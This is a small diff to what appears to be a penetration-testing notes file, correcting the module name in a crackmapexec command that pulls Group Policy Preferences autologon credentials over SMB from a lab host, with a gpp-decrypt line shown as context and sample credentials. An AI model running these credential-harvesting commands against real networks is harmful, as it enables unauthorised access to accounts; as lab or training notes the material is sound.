@@ -28,7 +28,7 @@ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
 
 Auto login with crackmapexec
 ```shell-session
-crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologi
+crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
 ```
 
 
